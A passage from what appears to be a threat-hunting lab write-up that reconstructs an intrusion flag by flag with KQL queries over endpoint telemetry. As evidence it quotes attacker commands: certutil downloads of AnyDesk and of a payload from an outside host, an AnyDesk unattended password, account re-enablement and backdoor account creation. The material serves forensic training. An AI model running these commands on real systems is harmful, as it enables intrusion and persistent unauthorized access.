| Timestamp (UTC) | 2026-01-15T04:41:10.4250664Z |
| Host | as-pc2 |
| AccountName | david.mitchell |
| FileName | AnyDesk.exe |
| Command | "AnyDesk.exe" |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has_any ("anydesk", "teamviewer", "screenconnect", "vnc", "remote", "radmin")
  or FileName has_any ("anydesk", "teamviewer", "screenconnect", "vnc", "radmin")
| project Timestamp,
         DeviceName,
         AccountName,
         FileName,
         ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 16: Remote Tool Hash (AnyDesk SHA256)</strong></summary>

### 🎯 Objective  
Identify the SHA256 file hash of the deployed remote access tool used for persistence.

---

### 📌 Finding  
Following confirmation of AnyDesk deployment for persistence, process execution telemetry was analyzed to extract cryptographic hash metadata tied to the staged binary. Hash data was sourced directly from endpoint telemetry to preserve integrity without relying on external tooling.

Telemetry revealed execution of:
**AnyDesk.exe** staged in a public directory

Process metadata exposed the associated SHA256 hash, uniquely identifying the binary used during the intrusion. This artifact enables high-confidence threat intelligence correlation and hash-based detection engineering.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:10:06.9484152Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| FileName | AnyDesk.exe |
| Path | C:\Users\Public\AnyDesk.exe |
| Command | AnyDesk.exe |
| SHA256 | f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532 |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where FileName =~ "AnyDesk.exe"
| project Timestamp,
         DeviceName,
         AccountName,
         FileName,
         FolderPath,
         ProcessCommandLine,
         SHA256
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 17: Download Method (Native LOLBin Tool Transfer)</strong></summary>

### 🎯 Objective  
Identify the native Windows binary used to download the remote access tool.

---

### 📌 Finding  
Following identification of the staged AnyDesk binary and its hash, process execution telemetry was analyzed to determine how the tool was retrieved. Command-line artifacts containing external URLs and staging paths revealed use of a native Windows utility for payload transfer.

Telemetry confirmed HTTP-based retrieval of the AnyDesk binary followed by local staging in a public directory. The download activity was attributed to a built-in Windows binary commonly abused during intrusions.

The LOLBin used for tool transfer was:
**certutil.exe**

This utility is frequently abused by attackers for ingress tool transfer due to its native availability and ability to download remote content.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:08:29.8398973Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Tool | certutil.exe |
| Command | certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe |
| Staging Path | C:\Users\Public\AnyDesk.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has "AnyDesk.exe"
| where ProcessCommandLine has_any ("http", "https")
| project Timestamp,
         DeviceName,
         AccountName,
         FileName,
         ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 18: Configuration Access (Remote Tool Configuration Artifact)</strong></summary>

### 🎯 Objective  
Identify the configuration file accessed after installation of the remote administration tool.

---

### 📌 Finding  
Following deployment of AnyDesk for persistence, process execution telemetry was analyzed for post-installation validation behavior. Attackers commonly inspect configuration artifacts to confirm installation success and retrieve operational identifiers.

Telemetry revealed command-line usage of native utilities to directly read a configuration file associated with the installed remote access software. The activity originated from the compromised user context and targeted the user’s roaming profile directory.

The accessed configuration artifact was:
**C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf**

This file contains core AnyDesk configuration data and is frequently accessed by operators to confirm persistence and validate remote access readiness.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:11:13.5896114Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Tool | cmd.exe |
| Command | cmd.exe /c "type C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf" |
| Config Path | C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has "AnyDesk"
| where ProcessCommandLine has_any ("type", ".conf", ".ini")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 19: Unattended Access Credential (Remote Persistence Password)</strong></summary>

### 🎯 Objective  
Identify the unattended access password configured for the deployed remote administration tool.

---

### 📌 Finding  
Following confirmation of AnyDesk deployment and configuration access, process telemetry was analyzed for persistence hardening behavior. Attackers frequently configure unattended access credentials to enable remote re-entry without requiring user interaction.

Command-line artifacts revealed use of the AnyDesk CLI with the `--set-password` argument. The password was passed directly through a command-line pipe, indicating deliberate unattended access configuration.

Telemetry exposed the configured credential used for persistent remote access:
**intrud3r!**

This password enables repeated remote access without user approval, significantly strengthening attacker persistence.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:11:47.1679716Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Tool | cmd.exe |
| Command | cmd.exe /c "echo intrud3r! \| C:\Users\Public\AnyDesk.exe --set-password" |
| Technique | AnyDesk unattended access configuration |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has "--set-password"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 20: Deployment Footprint (Remote Tool Spread Across Environment)</strong></summary>

### 🎯 Objective  
Identify all hosts where the attacker deployed the remote administration tool to determine the persistence scope.

---

### 📌 Finding  
After confirming installation, configuration, and credential persistence for AnyDesk, process telemetry was analyzed across the environment to determine the full deployment footprint. Aggregated execution activity associated with the AnyDesk binary revealed multiple systems exhibiting evidence of execution.

Environment-wide telemetry confirmed the remote administration tool executed on multiple hosts, indicating successful lateral propagation and expanded persistence beyond the initial compromise.

The affected systems identified were:
- **as-pc1** — Initial staging and execution host  
- **as-pc2** — Lateral deployment target  
- **as-srv** — Additional host demonstrating expanded persistence scope

This distribution confirms the attacker established durable access across multiple endpoints using legitimate remote administration tooling.

---

### 🔍 Evidence

| DeviceName | ExecutionCount |
|-----------|--------------|
| as-srv | 16 |
| as-pc1 | 16 |
| as-pc2 | 15 |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where FileName =~ "AnyDesk.exe"
| summarize ExecutionCount=count() by DeviceName
| order by ExecutionCount desc
```

</details>

---

<details>
<summary><strong>🚩 Flag 21: Failed Execution Attempts (Unsuccessful Lateral Movement Tools)</strong></summary>

### 🎯 Objective  
Identify remote execution tools attempted by the attacker that failed prior to successful lateral movement.

---

### 📌 Finding  
Following confirmation of lateral propagation, process telemetry was analyzed to identify early failed execution attempts. Attackers often test multiple remote execution methods before establishing reliable lateral movement.

Process artifacts tied to the compromised account revealed multiple remote execution commands targeting additional hosts. Command-line analysis exposed trial usage of different remote execution utilities during the attacker’s experimentation phase.

Two tools were observed during unsuccessful execution attempts:
- **PsExec** — SMB-based remote service execution  
- **WMIC** — WMI-based remote command invocation  

While WMIC was later used successfully, early telemetry indicates both tools were tested during initial lateral movement attempts.

This pattern reflects iterative attacker behavior commonly observed during hands-on-keyboard intrusions.

---

### 🔍 Evidence

| Timestamp (UTC) | Device | Tool | Command Snippet |
|----------------|--------|------|----------------|
| 2026-01-15T04:23:20.0107844Z | as-pc1 | WMIC.exe | WMIC.exe /node:AS-PC2 process call create ... |
| 2026-01-15T04:24:26.7361057Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 -u Administrator -p ********** cmd.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2","as-srv")
| where AccountName =~ "sophie.turner" or InitiatingProcessAccountName =~ "sophie.turner"
| extend Cmd = tostring(ProcessCommandLine)
| where isnotempty(Cmd)
| where Cmd has_any ("\\\\", "/node:", " /S ", " -ComputerName ", "Enter-PSSession", "Invoke-Command")
| where Cmd has_any ("psexec", "wmic", "winrs", "schtasks", "at.exe", "sc.exe")
| project Timestamp, DeviceName, AccountName, FileName, Cmd
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 22: Target Host (Failed Remote Execution Target)</strong></summary>

### 🎯 Objective  
Identify the hostname targeted during failed remote execution attempts.

---

### 📌 Finding  
Following identification of failed lateral movement attempts, process telemetry was analyzed to determine the intended remote target. Attackers often repeatedly target the same host while refining execution techniques.

Command-line artifacts tied to the compromised account revealed multiple remote execution attempts using both PsExec and WMIC. Extraction of remote host indicators from UNC paths and `/node:` parameters showed a consistent lateral movement target.

All failed execution attempts referenced:
**AS-PC2**

The hostname appeared repeatedly across multiple command invocations, confirming it as the primary early-stage lateral movement target.

---

### 🔍 Evidence

| Timestamp (UTC) | Source Host | Tool | Command Snippet |
|----------------|------------|------|----------------|
| 2026-01-15T04:23:20Z | as-pc1 | WMIC.exe | WMIC.exe /node:AS-PC2 process call create ... |
| 2026-01-15T04:24:26Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 -u Administrator ... |
| 2026-01-15T04:25:42Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 cmd.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where AccountName =~ "sophie.turner"
| where ProcessCommandLine has_any ("psexec", "/node:")
| extend TargetHost = extract(@"\\\\([A-Za-z0-9\-]+)|/node:([A-Za-z0-9\-]+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, ProcessCommandLine, TargetHost
```

</details>

---

<details>
<summary><strong>🚩 Flag 23: Successful Pivot (Alternate Lateral Movement Method)</strong></summary>

### 🎯 Objective  
Identify the Windows executable used to achieve lateral movement after earlier remote execution attempts failed.

---

### 📌 Finding  
Following failed remote execution attempts using PsExec and WMIC, network telemetry was analyzed for alternate lateral movement techniques. Attackers commonly pivot to interactive access when automated tooling proves unreliable.

Outbound connections over TCP port 3389 were observed during the attack window, indicating Remote Desktop Protocol (RDP) activity. Correlation with initiating process metadata revealed the native Windows executable responsible for establishing the session.

The successful pivot was performed using:
**mstsc.exe**

This binary is the native Windows Remote Desktop client and confirms the attacker transitioned to manual interactive lateral movement.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:29:45.3012715Z |
| Source Host | as-pc1 |
| Account | sophie.turner |
| Process | mstsc.exe |
| Remote IP | 10.1.0.183 |
| Remote Port | 3389 |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceNetworkEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2","as-srv")
| where RemotePort == 3389
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 24: Movement Path (Lateral Movement Sequence Reconstruction)</strong></summary>

### 🎯 Objective  
Reconstruct the full lateral movement path by determining the order in which the attacker moved between hosts.

---

### 📌 Finding  
To reconstruct attacker movement across the environment, telemetry associated with the deployed persistence tool (AnyDesk.exe) was aggregated. The first observed appearance of the tool on each host was used as a reliable marker for lateral movement progression.

By correlating file creation and process execution events, the earliest evidence of tool presence was identified per host and ordered chronologically.

The reconstructed movement sequence was:
- **as-pc1** — Initial foothold and staging location  
- **as-pc2** — First lateral movement target  
- **as-srv** — Expanded persistence scope  

This timeline reflects staged lateral movement from the initial workstation to additional endpoints and ultimately server infrastructure.

---

### 🔍 Evidence

| Host | First Seen (UTC) | Evidence Types |
|------|-----------------|--------------|
| as-pc1 | 2026-01-15T04:08:32.3138216Z | FileEvent, ProcessEvent |
| as-pc2 | 2026-01-15T04:40:58.7958316Z | FileEvent, ProcessEvent |
| as-srv | 2026-01-15T04:57:07.3241004Z | FileEvent, ProcessEvent |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
let tool = "AnyDesk.exe";
union
(
 DeviceFileEvents
 | where Timestamp between (start .. end)
 | where FileName =~ tool
 | project Timestamp, DeviceName, Evidence="FileEvent", Detail=strcat(ActionType, " ", FolderPath)
),
(
 DeviceProcessEvents
 | where Timestamp between (start .. end)
 | where FileName =~ tool
 | project Timestamp, DeviceName, Evidence="ProcessEvent", Detail=ProcessCommandLine
)
| summarize FirstSeen=min(Timestamp), EvidenceSeen=make_set(Evidence, 10) by DeviceName
| order by FirstSeen asc
| project DeviceName, FirstSeen, EvidenceSeen
```

</details>

---

<details>
<summary><strong>🚩 Flag 25: Compromised Account (Successful Lateral Authentication)</strong></summary>

### 🎯 Objective  
Identify the valid account used for successful authentication during lateral movement.

---

### 📌 Finding  
Following reconstruction of the attacker’s movement path, authentication telemetry was analyzed to determine which identity successfully authenticated across pivot hosts. Logon telemetry from lateral targets revealed the earliest authenticated identity appearing after the attacker transitioned from the initially compromised workstation.

The earliest confirmed successful authentication on a pivot host was performed by:
**david.mitchell**

This account appeared on a lateral movement target following the initial compromise, indicating credential reuse during attacker propagation.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| AccountName | david.mitchell |
| Host | as-srv |
| First Seen (UTC) | 2026-01-15T02:00:13.9683262Z |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceLogonEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc2","as-srv")
| summarize FirstSeen=min(Timestamp) by AccountName, DeviceName
| order by FirstSeen asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 26: Account Activation (Disabled Account Re-Enablement)</strong></summary>

### 🎯 Objective  
Identify the parameter used to activate a previously disabled account.

---

### 📌 Finding  
Following credential abuse and lateral movement activity, process telemetry was analyzed for account lifecycle manipulation behaviors. Attackers commonly re-enable dormant accounts to establish persistence while blending into legitimate administrative workflows.

Process execution artifacts revealed use of the Windows account management utility **net.exe** with command-line arguments indicative of account activation. Inspection of execution parameters confirmed the attacker re-enabled a disabled account using a native account control flag.

The parameter observed was:
**/active:yes**

This flag is used with the `net user` command to activate disabled accounts, enabling authentication and long-term persistence.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:40:31.9488698Z |
| Host | as-pc2 |
| AccountName | david.mitchell |
| Tool | net.exe |
| Command | "net.exe" user Administrator /active:yes |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where FileName =~ "net.exe"
| where ProcessCommandLine has "active"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 27: Activation Context (User Responsible for Account Activation)</strong></summary>

### 🎯 Objective  
Identify the user responsible for activating the disabled account.

---

### 📌 Finding  
Following confirmation that a disabled account was re-enabled using the `/active:yes` parameter, process telemetry was analyzed to determine the execution context of the activation. Identifying the executing user provides attribution for account manipulation activity.

Execution metadata tied to the `net.exe` activation command revealed the user responsible for performing the action. The process context clearly showed the activation was executed under a valid compromised identity.

The account responsible for the activation was:
**david.mitchell**

This confirms the attacker used an already compromised account to modify account states and strengthen persistence.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:40:31.9488698Z |
| Host | as-pc2 |
| Executing User | david.mitchell |
| Tool | net.exe |
| Command | "net.exe" user Administrator /active:yes |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where FileName =~ "net.exe"
| where ProcessCommandLine has "active"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 28: Scheduled Persistence (Noise-Reduced Detection)</strong></summary>

### 🎯 Objective  
Identify the attacker-created scheduled task used for persistence while filtering environmental noise.

---

### 📌 Finding  
Following identification of multiple persistence mechanisms, process telemetry was analyzed for scheduled task creation activity. Because scheduled task telemetry can be noisy due to legitimate scanning and administrative tooling, filtering focused on high-confidence attacker indicators such as:

- Task creation activity (`/create`)
- Execution from attacker staging paths (`C:\Users\Public`)
- Elevated run level (`/rl highest`)
- Explicit payload execution (`/tr`)

After reducing environmental noise, a recurring scheduled task was identified across compromised hosts.

The malicious task name was:
**MicrosoftEdgeUpdateCheck**

Key indicators of malicious persistence:
- Masquerading as a legitimate Microsoft update task  
- Executing payload from a public staging directory  
- Configured for elevated execution  
- Observed across multiple compromised systems

This behavior strongly indicates deliberate persistence establishment using scheduled task masquerading.

---

### 🔍 Evidence

| Timestamp (UTC) | Host | Account | Task Name | Payload |
|----------------|------|--------|----------|--------|
| 2026-01-15T04:52:32.6871861Z | as-pc2 | david.mitchell | MicrosoftEdgeUpdateCheck | C:\Users\Public\RuntimeBroker.exe |
| 2026-01-15T04:56:59.3404574Z | as-srv | as.srv.administrator | MicrosoftEdgeUpdateCheck | C:\Users\Public\RuntimeBroker.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2","as-srv")
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| where ProcessCommandLine has_any (@"C:\Users\Public\", "/rl highest", "/tr")
| extend TaskName = extract(@"(?i)/tn\s+(""[^""]+""|\S+)", 1, ProcessCommandLine)
| extend TaskRun  = extract(@"(?i)/tr\s+(""[^""]+""|\S+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, AccountName, TaskName, TaskRun, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 29: Renamed Binary (Masqueraded Persistence Payload)</strong></summary>

### 🎯 Objective  
Identify the filename used for the renamed persistence payload deployed by the attacker.

---

### 📌 Finding  
Following discovery of scheduled task persistence, analysis pivoted to identifying the underlying payload executed by the task. Since attackers frequently rename binaries to evade detection, process telemetry was reviewed for payload staging activity in suspicious directories.

Execution artifacts revealed download and staging of a payload into a public directory using a renamed filename. Command-line telemetry showed the attacker downloading a payload from external infrastructure and writing it to disk under a different name.

The renamed payload path observed in telemetry:
**C:\Users\Public\RuntimeBroker.exe**

Although RuntimeBroker.exe is a legitimate Windows binary name, it normally resides in the System32 directory. Its presence in a public staging directory strongly indicates masquerading.

This demonstrates deliberate evasion by renaming a malicious payload to resemble a trusted Windows process.

---

### 🔍 Evidence

| Timestamp (UTC) | Host | Account | Artifact |
|----------------|------|--------|---------|
| 2026-01-15T04:52:22.9618142Z | as-pc2 | david.mitchell | certutil download staging RuntimeBroker.exe |
| 2026-01-15T04:56:52.1863624Z | as-srv | as.srv.administrator | Payload staged as RuntimeBroker.exe |

**Key command-line artifact:**
```
certutil.exe -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
```

This shows the original payload being written to disk under a renamed filename.

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where ProcessCommandLine has "Users\\Public\\RuntimeBroker.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

</details>

---

<details>
<summary><strong>🚩 Flag 30: Persistence Payload Hash (RuntimeBroker Masquerade)</strong></summary>

### 🎯 Objective  
Identify the SHA256 hash associated with the persistence payload deployed by the attacker.

---

### 📌 Finding  
After identifying scheduled task persistence using a masqueraded binary (`RuntimeBroker.exe` staged in `C:\Users\Public`), analysis pivoted to extracting the cryptographic fingerprint of the payload.  

Process telemetry was scoped to confirmed compromised hosts and filtered for execution artifacts referencing the renamed persistence binary. Aggregated execution metadata revealed consistent hashes tied to the payload across multiple hosts, confirming reuse of the same staged persistence artifact.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| First Seen (UTC) | 2026-01-15 04:52:22 |
| Hosts Observed | as-pc2, as-srv |
| Payload Path | C:\Users\Public\RuntimeBroker.exe |
| Hash Type | SHA256 |
| Observed Hashes | 2327e073dcf25ae03dc851ea0f3414980d3168fa959f42c5f77be1381ae6c41d<br>fd1670b43e2d9188b12b233780bf043c5a90a67a2c6e3fcdc564a5c246531bc2<br>da603fa720ab43aa6d4d36aa9fdb828dab9645523eabaac209af6451d5b4d757<br>98d63f0f44c8afaf1a4b11e38e92f81add7f59fd1ff7b296fc3d40c7f0094177<br>812ccfa2d234ef9989e1730976dd8217d0f3107fbd92244454a5fb735051b8db |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2","as-srv")
| where ProcessCommandLine has "Users\\Public\\RuntimeBroker.exe"
| summarize
    FirstSeen=min(Timestamp),
    Hosts=make_set(DeviceName),
    Hashes=make_set(SHA256)
```

</details>

---

<details>
<summary><strong>🚩 Flag 31: Backdoor Account (Local Account Creation for Persistence)</strong></summary>

### 🎯 Objective  
Identify the newly created local account used by the attacker to maintain persistent access.

---

### 📌 Finding  
Process telemetry revealed execution of the Windows account management utility `net.exe` with parameters consistent with local user creation. The observed command showed explicit account creation using the `/add` parameter, confirming the creation of a new local persistence account.

The command observed:
`net.exe user svc_backup ********** /add`

This confirms the attacker created a new local account designed to blend in with legitimate service-style naming conventions.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:57:47.0153078Z |
| DeviceName | as-pc1 |
| Executing User | sophie.turner |
| Command | net.exe user svc_backup ********** /add |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2","as-srv")
| where FileName =~ "net.exe"
| where ProcessCommandLine has "user"
| where ProcessCommandLine has_any ("/add", "add ")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 32: Sensitive Document (Pre-Exfiltration Target Identification)</strong></summary>

### 🎯 Objective  
Identify the sensitive document accessed by the attacker on the file server.

---

### 📌 Finding  
File activity telemetry on the file server (**as-srv**) revealed multiple document interactions under shared directories. To avoid post-impact artifacts (e.g., ransomware-encrypted files), analysis focused on indicators of genuine user interaction such as editor lock files and rename patterns.

Among the observed files, one document showed strong signals of active access including LibreOffice lock artifacts and modification sequences prior to staging activity.

The identified sensitive document:  
**BACS_Payments_Dec2025.ods**

Supporting telemetry included editor lock artifacts:  
`.~lock.BACS_Payments_Dec2025.ods#`

These lock files are generated only when a document is actively opened, confirming pre-exfiltration access rather than post-impact encryption.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-srv |
| Lock Artifact | .~lock.BACS_Payments_Dec2025.ods# |
| First Seen (UTC) | 2026-01-15T04:44:06.0147429Z |
| Last Seen (UTC) | 2026-01-15T04:47:33.8665892Z |
| File Type | LibreOffice Spreadsheet (.ods) |

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceFileEvents
| where Timestamp between (start..end)
| where DeviceName == "as-srv"
| where FolderPath startswith @"C:\Shares\"
| where FileName has_any (".pdf",".docx",".xlsx",".csv",".pptx",".txt",".ods",".zip",".7z",".rar",".akira")
| summarize Hits=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Actions=make_set(ActionType,20) by FileName
| order by Hits desc, FirstSeen asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 33: Modification Evidence (Editing Artifact Identification)</strong></summary>

### 🎯 Objective  
Identify the file artifact proving the sensitive document was opened for editing rather than passive viewing.

---

### 📌 Finding  
Following identification of the sensitive financial document on the file server (**as-srv**), analysis pivoted to determining whether the file was actively edited or simply accessed.

File telemetry revealed the presence of a LibreOffice editing lock artifact associated with the document. LibreOffice generates lock files prefixed with `.~lock.` and suffixed with `#` whenever a document is opened for editing.

The artifact identified:  
**.~lock.BACS_Payments_Dec2025.ods#**

Because lock files are only generated during active editing sessions, their presence provides strong forensic evidence that the attacker opened the document in an editor rather than passively viewing or copying it.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-srv |
| FolderPath | C:\Shares\Payroll\.~lock.BACS_Payments_Dec2025.ods# |
| ActionType | FileCreated |
| Timestamp (UTC) | 2026-01-15T04:46:23.549337Z |
| Initiating Process | ntoskrnl.exe (system-level file creation) |

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceFileEvents
| where Timestamp between (start..end)
| where DeviceName == "as-srv"
| where FolderPath startswith @"C:\Shares\"
| where FileName startswith ".~lock."
| project Timestamp,
         DeviceName,
         FileName,
         FolderPath,
         ActionType,
         InitiatingProcessAccountName,
         InitiatingProcessFileName
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 34: Access Origin (Workstation Attribution via SMB Telemetry)</strong></summary>

### 🎯 Objective  
Identify the workstation from which the sensitive document was accessed on the file server.

---

### 📌 Finding  
Following confirmation that the sensitive financial document was accessed and edited on the file server (**as-srv**), analysis pivoted to determining the true origin of the interaction.

Server-side file telemetry identified document access but only showed system-level handling processes, which is expected for SMB file operations. To determine the originating client, the investigation pivoted to SMB network telemetry during the document editing timeframe.

By analyzing SMB traffic (port 445) during the window surrounding the editing lock artifact, a single workstation was observed initiating file share connections to the server.

The originating workstation identified:  
**as-pc2**

This system established SMB sessions to the file server at the same time the editing lock file was created, indicating it was the endpoint used to access and modify the sensitive document.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-27T18:47:05.9221979Z |
| Source Device | as-pc2 |
| Destination | as-srv |
| RemoteIP | 10.1.0.203 |
| Protocol | SMB (Port 445) |
| Initiating Process | ntoskrnl.exe (system SMB handler) |

---

### 🧠 Query
```kql
let start=datetime(2026-01-15 04:40:00);
let end=datetime(2026-01-27 04:50:00);
DeviceNetworkEvents
| where Timestamp between (start..end)
| where RemotePort == 445
| where RemoteIP contains "as-srv" or RemoteUrl contains "as-srv"
| project Timestamp,
         DeviceName,
         InitiatingProcessAccountName,
         InitiatingProcessFileName,
         RemoteIP,
         RemoteUrl
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 35: Exfil Archive (Pre-Exfiltration Packaging)</strong></summary>

### 🎯 Objective  
Identify the archive file created to stage data prior to exfiltration.

---

### 📌 Finding  
After confirming access and editing of a sensitive financial document on the file server (**as-srv**), analysis pivoted to identifying data staging behavior. Attackers commonly compress collected data into archives prior to exfiltration to reduce size, enable encryption, and simplify transfer.

File telemetry on the file server was analyzed for compressed archive formats commonly associated with staging activity (e.g., `.7z`, `.zip`, `.rar`). This surfaced the creation of a compressed archive shortly after sensitive document interaction.

The archive identified:  
**Shares.7z**

The archive appeared immediately after document interaction and was later moved within the shared directory structure, indicating intentional staging and organization prior to exfiltration.

---

### 🔍 Evidence

| Timestamp (UTC) | FileName | Path | Action |
|----------------|----------|------|--------|
| 2026-01-15T04:59:04.9120277Z | Shares.7z | C:\Shares.7z | FileCreated |
| 2026-01-15T04:59:47.9246654Z | Shares.7z | C:\Shares\Clients\Shares.7z | FileRenamed |

This rename sequence indicates active handling and staging of the archive within shared directories.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceFileEvents
| where Timestamp between (start..end)
| where DeviceName == "as-srv"
| where FileName endswith ".7z"
| project Timestamp, FileName, FolderPath, ActionType
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 36: Archive Hash (Staged Data Integrity)</strong></summary>

### 🎯 Objective  
Identify the SHA256 hash of the archive used to stage data prior to exfiltration.

---

### 📌 Finding  
After identifying the staged archive (**Shares.7z**) on the file server (**as-srv**), analysis pivoted to extracting the cryptographic fingerprint of the archive directly from endpoint telemetry.

Initial results surfaced hashes tied to compression utilities (e.g., 7z binaries), which were excluded as tooling artifacts. The investigation was refined to isolate file telemetry explicitly referencing the archive itself while retaining only entries containing a valid SHA256 value.

This approach ensured the recovered hash represented the staged data artifact rather than the compression utility used to generate it.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| First Seen (UTC) | 2026-01-15T04:59:04.9120277Z |
| Host | as-srv |
| FileName | Shares.7z |
| SHA256 | 6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048 |

This hash uniquely identifies the archive used to bundle collected data prior to exfiltration.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceFileEvents
| where Timestamp between (start..end)
| where DeviceName == "as-srv"
| where FileName =~ "Shares.7z"
| project Timestamp,
         DeviceName,
         FileName,
         FolderPath,
         SHA256,
         ActionType
| where isnotempty(SHA256)
